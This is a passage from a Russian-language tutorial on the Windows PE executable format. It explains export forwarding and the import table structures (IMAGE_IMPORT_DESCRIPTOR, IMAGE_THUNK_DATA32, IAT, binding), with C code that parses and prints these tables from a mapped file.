&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> j<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>j<span style="color: #339933;">&lt;</span>Export<span style="color: #339933;">-&gt;</span>NumberOfNames<span style="color: #339933;">;</span>j<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>AddressOfNameOrdinals<span style="color: black;">&#91;</span>j<span style="color: black;">&#93;</span><span style="color: #339933;">==</span><span style="color: black;">&#40;</span>i<span style="color: #339933;">+</span>Export<span style="color: #339933;">-&gt;</span>Base<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; index<span style="color: #339933;">=</span>j<span style="color: #339933;">;</span><span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>AddressOfFunctions<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: #339933;">&gt;=</span>pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">DataDirectory</span><span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;&amp;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>AddressOfFunctions<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: #339933;">&lt;=</span>pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">DataDirectory</span><span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span>.<span style="color: #202020;">VirtualAddress</span><span style="color: #339933;">+</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">DataDirectory</span><span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span>.<span style="color: #202020;">Size</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>index<span style="color: #339933;">!=</span><span style="color: #208080;">0xFFFF</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%4d |%-35s |Forw-&gt;%s<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i<span style="color: #339933;">+</span>Export<span style="color: #339933;">-&gt;</span>Base<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">+</span>RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; AddressOfNames<span style="color: black;">&#91;</span>index<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">+</span>RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; AddressOfFunctions<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%4d |OrdinalOnly |Forw-&gt;%s<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i<span style="color: #339933;">+</span>Export<span style="color: #339933;">-&gt;</span>Base<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">+</span>RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; AddressOfNames<span style="color: black;">&#91;</span>index<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">+</span>RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; AddressOfFunctions<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>index<span style="color: #339933;">!=</span><span style="color: #208080;">0xFFFF</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%4d |%-35s |%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i<span style="color: #339933;">+</span>Export<span style="color: #339933;">-&gt;</span>Base<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">+</span>RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; AddressOfNames<span style="color: black;">&#91;</span>index<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; AddressOfFunctions<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;%4d |OrdinalOnly |%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i<span style="color: #339933;">+</span>Export<span style="color: #339933;">-&gt;</span>Base<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; AddressOfFunctions<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
<span style="color: black;">&#125;</span><br />
&nbsp;</div>
<h3><a name="c2e"></a>Таблица импорта</h3>
<p>Импорт в PE-файлах - это механизм позволяющий использовать функции или переменные из модулей отличных от данного. Если наша программа вызывает функцию GetMessage, которая находиться в библиотеке KERNEL32. DLL, то вместо инструкции CALL используется инструкция JMP DWORD PTR [XXXXXXXX]. Адрес указанный как XXXXXXXX находиться где-то в таблице импорта. Посмотрите на рисунок, и Вы все поймете:</p>
<div align="center">
	<img src="img/vbp01/fig23.gif" alt="" />
</div>
<p>Это очень удачное решение - хранить адрес функции в одном месте. Если DLL загрузиться по определенному адресу, то загрузчику необходимо изменить только адрес функции в таблице импорта, а не каждый вызов данной функции.</p>
<p>Директория импорта и таблица импорта есть понятия эквивалентные, так что имейте это ввиду при чтении других авторов.</p>
<p>Импорт PE-файлов может происходить четырьмя различными способами. Повеселимся над этими механизмами и терминами, используемыми при импорте функций PE-файла. Импорт файлов - это первая вещь, которая действительно интересна.</p>
<h3><a name="c2f"></a>Структуры и термины импорта</h3>
<p>Когда загружается исполняемый файл, то загрузчик использует таблицу импорта, чтобы узнать какие функции импортирует данный модуль. Потом загрузчик загружает библиотеки содержащие данные функции, если они не загружены, с помощью функции LoadLibrary. LoadLibrary возвращает адрес библиотеки в адресном пространстве текущего процесса. Чтобы получить адрес функции надо использовать функцию GetProcAddress. Ей передается имя функции и базовый адрес библиотеки. Т.о. в таблицу импорта добавляются адреса нужных функций при загрузке, а потом используются после загрузки. В некоторых библиотеках адреса функций уже имеются, это сделано в целях оптимизации, но об этом немного позже (в разделе "Биндинг-).</p>
<p>Таблица импорта начинается с массива элементов типа IMAGE_IMPORT_DESCRIPTOR. Количество элементов массива нигде не указывается, но вместо этого первый элемент последнего члена массива - нулевой. Каждый элемент соответствует DLL, из которой импортируют функции. Каждый элемент выглядит следующим образом:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _IMAGE_IMPORT_DESCRIPTOR <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">union</span> <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; Characteristics<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// 0 for terminating null import descriptor</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; OriginalFirstThunk<span style="color: #339933;">;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; TimeDateStamp<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// 0 if not bound,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// -1 if bound, and real date\time stamp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// O.W. date/time stamp of DLL bound to (Old BIND)</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; ForwarderChain<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// -1 if no forwarders</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; Name<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; FirstThunk<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// RVA to IAT (if bound this IAT has actual addresses)</span><br />
<span style="color: black;">&#125;</span> IMAGE_IMPORT_DESCRIPTOR<span style="color: #339933;">;</span><br />
<span style="color: #993333;">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED <span style="color: #339933;">*</span>PIMAGE_IMPORT_DESCRIPTOR<span style="color: #339933;">;</span><br />
&nbsp;</div>
<p>Опишем поля этой структуры по порядку.</p>
<dl>
	<dt><src>
	union {
		DWORD	Characteristics;	// 0 for terminating null import descriptor
		DWORD	OriginalFirstThunk;	// RVA to original unbound IAT (PIMAGE_THUNK_DATA)
	};</src></dt>
	<dd>Это поле содержит RVA массива двойных слов. Каждый элемент этого массива является объединением IMAGE_THUNK_DATA32 и соответствует функции PE-файла соответствующего элементу IMAGE_IMPORT_DESCRIPTOR. Это поле равно нулю, если это последний элемент в массиве элементов типа IMAGE_IMPORT_DESCRIPTOR. Это поле должно быть больше SizeOfHeaders и меньше либо равно SizeOfImage, иначе файл загружен не будет.</dd>
	<dt><strong>DWORD TimeDateStamp;</strong></dt><dd>Временная отметка, когда был создан данный файл. От этого поля зависит, как загрузчик будет обрабатывать импорт данного файла. Если оно равно нулю, то загрузчик обрабатывает таблицу импорта как надо, т.е. используя стандартный механизм. Если она равна -1, то загрузчик не смотрит на массивы OriginalFirstThunk и FirstThunk, а полагает, что данная библиотека импортируется через Bound-импорт (о нем позже). Если TimeDateStamp обозначает временную метку, то если она равна временной метке импортируемой DLL, загрузчик просто проецирует ее на адресное пространство процесса, не настраивая таблицу адресов IAT. Если штамп времени есть, но он не совпадает с штампом DLL, то загрузчик настраивает таблицу как обычно. Т.о. предполагается, что адреса функций заданы во время компиляции, т.е. используется "биндинг- (подробнее об этом ниже).</dd>
	<dt><strong>DWORD ForwarderChain;</strong></dt><dd>Это поле связано с передачей экспорта, описанного выше. Это поле содержит индекс в массиве FirstThunk. Функция указанная этим полем, будет послана в другую DLL. Загрузчик не проверяет это поле, так что оно может иметь любой значение.</dd>
	<dt><strong>DWORD Name;</strong></dt><dd>Имя DLL, откуда импортируются функции.</dd>
	<dt><strong>DWORD FirstThunk;</strong></dt><dd>RVA массива двойных слов. Каждый элемент массива типа IMAGE_THUNK_DATA32. Об этом типе далее.</dd>
</dl>
<p>В структуре IMAGE_IMPORT_DESCRIPTOR содержатся указатели на массивы элементов типа IMAGE_THUNK_DATA. Эти массивы называются таблицами адресов импорта (IAT - import address table). Вообще, т.к. массив OriginalFirstThunk не патчится загрузчиком, то только FirstThunk считается настоящей таблицей адресов импорта - IAT.</p>
<p>Теперь необходимо описать двойное слово IMAGE_THUNK_DATA. Он определена следующим образом:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _IMAGE_THUNK_DATA32<br />
<span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">union</span> <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; ForwarderString<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// PBYTE</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; Function<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// PDWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; Ordinal<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; AddressOfData<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// PIMAGE_IMPORT_BY_NAME</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> u1<span style="color: #339933;">;</span><br />
<span style="color: black;">&#125;</span> IMAGE_THUNK_DATA32<span style="color: #339933;">;</span><br />
&nbsp;</div>
<p>Это двойное слово соответствует одной импортируемой функции. Это двойное слово отличается, если файл был загружен в память или была ли функция импортирована по имени или по номеру. Если функция импортируется по номеру (ординалу), старший бит двойного слова устанавливается в 1. Импорт по ординалу производиться очень редко. Мы должны убрать эту единицу в последнем разряде и использовать полученное значение как ординал.</p>
<p>Если происходит импорт по имени, то двойное слово содержит RVA структуры IMAGE_IMPORT_BY_NAME. Эта структура определена следующим образом:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _IMAGE_IMPORT_BY_NAME <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; Hint<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; BYTE&nbsp; &nbsp; Name<span style="color: black;">&#91;</span><span style="color: #339933;">?</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br />
<span style="color: black;">&#125;</span> IMAGE_IMPORT_BY_NAME<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>PIMAGE_IMPORT_BY_NAME<span style="color: #339933;">;</span><br />
&nbsp;</div>
<dl>
	<dt><strong>WORD Hint;</strong></dt><dd>Укороченный идентификатор точки входа.</dd>
	<dt><strong>BYTE Name[?];</strong></dt><dd>Название импортированной функции.</dd>
</dl>
<h3><a name="c2g"></a>Стандартный механизм импорта</h3>
<p>В таблице импорта вначале идет массив из элементов типа IMAGE_IMPORT_DESCRIPTOR. Каждый элемент соответствует одной DLL из которой импортируются функции. Самыми главными частями IMAGE_IMPORT_DESCRIPTOR являются имя DLL и два массива элементов типа IMAGE_THUNK_DATA32. В принципе они эквивалентны и идут параллельно. Но есть определенная логическая нагрузка на один и второй массивы. Конец массива IMAGE_THUNK_DATA32 определяется нулевым DWORD'ом. Первый массив - OriginalFirstThunk, остается неизменным при загрузке. Второй массив - FirstThunk правиться при запуске программы, загрузчиком. Вот он содержит адреса всех импортируемых функций. Вообще поле OriginalFirstThunk может быть любым и не используется загрузчиком. Для системных DLL массив OriginalFirstThunk сразу содержит адреса импортируемых функций. Т.е. для таких DLL, массив OriginalFirstThunk содержит не элемент IMAGE_THUNK_DATA32, а уже адрес для импортируемой функции данным модулем. Второй массив содержит, если функция импортируется по имени, RVA на структуру IMAGE_IMPORT_BY_NAME. Эта структура, содержит имя нужной функции. Сначала загрузчик просматривает массив IMAGE_IMPORT_DESCRIPTOR и проецирует в адресное пространство текущего процесса нужные модули, содержащие импортируемые функции. Далее загрузчик просматривает массив из IMAGE_THUNK_DATA32 и вызывает для каждого имени GetProcAddress. После вызова GetProcAddress возвращает адрес точки входа в функцию. Этот адрес записывается на место, где был RVA IMAGE_IMPORT_BY_NAME. Точно также происходит импорт по ординалу, только GetProcAddress передается не указатель на имя функции, а ординал. Если импортируется переданная функция, то в DWORD'е массива FirstThunk содержиться указатель на строку форвардной функции. Все эти действия ведутся с массивом имен FirstThunk. Массив OriginalFirstThunk остается прежним. Линкеры фирмы Borland делают массив OriginalFirstThunk нулевым, что можно считать ошибкой, но мы должны с ней считаться.</p>
<h3><a name="c2h"></a>Пример работы с таблицей импорта</h3>
<p>Посмотрите код, который выводит на экран всю таблицу импорта. Вы должны спроецировать PE-файл с помощью CreateFile-&gt;CreateFileMapping-&gt;MapViewOfFile. В hMap передайте значение возвращенное MapViewOfFile.</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">void</span> printImportTable<span style="color: black;">&#40;</span><span style="color: #993333;">long</span> hMap<span style="color: black;">&#41;</span><br />
<span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_NT_HEADERS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_NT_HEADERS<span style="color: black;">&#41;</span>NTSIGNATURE<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_IMPORT_DESCRIPTOR&nbsp; &nbsp; &nbsp; &nbsp; Import<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_IMPORT_DESCRIPTOR<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>RVAtoOffset<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">DataDirectory</span><span style="color: black;">&#91;</span>IMAGE_DIRECTORY_ENTRY_IMPORT<span style="color: black;">&#93;</span>.<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #202020;">VirtualAddress</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>hMap<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; IMAGE_THUNK_DATA32<span style="color: #339933;">*</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Thunk<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_IMPORT_BY_NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ImportName<span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span>Import<span style="color: #339933;">-&gt;</span>Characteristics<span style="color: #339933;">!=</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x<span style="color: #339933;">++;</span><br />
